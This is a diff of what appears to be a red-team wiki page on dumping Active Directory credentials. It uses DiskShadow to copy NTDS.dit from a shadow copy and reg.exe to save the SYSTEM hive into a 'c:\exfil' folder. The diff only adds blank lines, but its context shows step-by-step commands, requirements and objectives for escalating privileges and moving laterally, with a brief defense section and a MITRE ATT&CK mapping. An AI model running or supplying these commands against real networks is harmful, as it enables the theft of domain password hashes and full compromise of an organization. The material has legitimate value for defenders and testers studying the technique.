@@ -36,6 +36,8 @@ From a technical perspective, this technique involves creating a DiskShadow scri
 
 The business value of this technique is that it enables an attacker to obtain domain credentials that can be used to escalate privileges, move laterally, or exfiltrate data. By compromising domain credentials, an attacker can gain full control of an organization's IT infrastructure.
 
+ 
+
 ## Requirements
 
 1. Access to a system that has the DiskShadow tool available
@@ -43,6 +45,8 @@ The business value of this technique is that it enables an attacker to obtain do
 1. Knowledge of the location of the NTDS.dit file on the target system
 
 1. Sufficient privileges to create and manage shadow copies of volumes
+
+ 
 
 ## Defense
 
@@ -52,6 +56,8 @@ The business value of this technique is that it enables an attacker to obtain do
 
 1. Implement the principle of least privilege to prevent attackers from obtaining the necessary privileges to execute this attack
 
+ 
+
 ## Objectives
 
 1. Obtain the NTDS.dit file from a shadow copy of the volume where it is located
@@ -59,6 +65,8 @@ The business value of this technique is that it enables an attacker to obtain do
 1. Extract the hashed passwords of all AD domain users from the NTDS.dit file
 
 1. Use the obtained credentials to escalate privileges, move laterally, or exfiltrate data
+
+ 
 
 # Instructions
 
@@ -71,10 +79,18 @@ The business value of this technique is that it enables an attacker to obtain do
 6. Run the command 'diskshadow.exe /s c:\diskshadow.txt'.
 7. After the command completes, run 'dir c:\exfil' to confirm that ntds.dit and system.bak were created in the C:\exfil directory.
 
+ 
+
+
+
 **Code**: [[diskshadow.txt contains :
 set context persistent n]]
 
+
+
 > This command uses DiskShadow, a tool included in Windows, to create a shadow copy of the C: drive and expose it as a Z: drive. It then uses the 'copy' command to copy the ntds.dit file, which contains Active Directory data, from the Z: drive to the C:\exfil directory. Finally, it deletes the shadow copy and saves the system registry to a file named system.bak in the C:\exfil directory. This command can be useful for extracting Active Directory data for forensic or backup purposes.
+
+
 
 **Command** ([[Create Disk Shadow Copy and Exfiltrate NTDS.dit]]):
 
@@ -88,17 +104,27 @@ delete shadows volume %someAlias%
 reset
 ```
 
+
+
+
+
 **Command** ([[Check Exfiltrated NTDS.dit File]]):
 
 ```bash
 dir c:\exfil
 ```
 
+
+
+
+
 **Command** ([[Backup System Registry]]):
 
 ```bash
 reg.exe save hklm\system c:\exfil\system.bak
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -121,3 +147,5 @@ reg.exe save hklm\system c:\exfil\system.bak
 - [[Active Directory Attacks]]
 - [[Dumping AD Domain Credentials]]
 - [[Using DiskShadow (a Windows signed binary)]]
+
+
